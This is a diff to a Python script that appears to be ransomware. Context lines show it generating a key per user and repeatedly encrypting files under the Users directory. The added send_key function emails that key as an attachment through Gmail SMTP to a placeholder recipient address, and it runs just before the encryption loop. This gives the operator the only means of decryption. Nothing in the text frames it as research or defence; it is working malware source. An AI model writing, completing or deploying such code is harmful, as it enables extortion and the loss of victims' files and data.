@@ -38,7 +38,42 @@ def file_encrypt(key, name):
 # CALL FUNCTION TO GENERATE KEY
 genkey(current_user)
 
-# FOR EVERYTIME ENCRYPTING FILES
+# SET DESTINATOR AND THE SENDER
+fromaddr = "FROM_TO@gmail.com"
+toaddr = "DEST_TO@gmail.com"
+
+# FUNCTION TO PREPARE THE MAIL
+def send_key():
+    try:
+        msg = MIMEMultipart()
+        msg['From'] = fromaddr
+        msg['To'] = toaddr
+        msg['Subject'] = "The second key generate by the reboot of system"
+        body = "The server you sending a key from the client, the script encrypted her files with this key."
+        msg.attach(MIMEText(body, 'plain'))
+        filename = "{}.key".format(current_user)
+        attachment = open(filename, "rb")
+        p = MIMEBase('application', 'octet-stream')
+        p.set_payload((attachment).read())
+        encoders.encode_base64(p)
+        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+        msg.attach(p)
+        s = smtplib.SMTP('smtp.gmail.com', 587)
+        s.starttls()
+        s.login(fromaddr, "YOUR_PASS_HERE")
+        text = msg.as_string()
+        s.sendmail(fromaddr, toaddr, text)
+        s.quit()
+    except IOError:
+        pass
+    except smtplib.SMTPAuthenticationError:
+        print("[!] Login or pass failed")
+        pass
+
+# CALL THE FUNCTION TO SEND THE MAIL
+send_key()
+
+# FOR EVERYTIME ENCRYPTING FILES ON THE SYSTEM
 while True:
     # LIST ALL FILES EXTENSIONS AND INVOKE ENCRYPTION FUNCTION
     rep = ['\\Users\\']
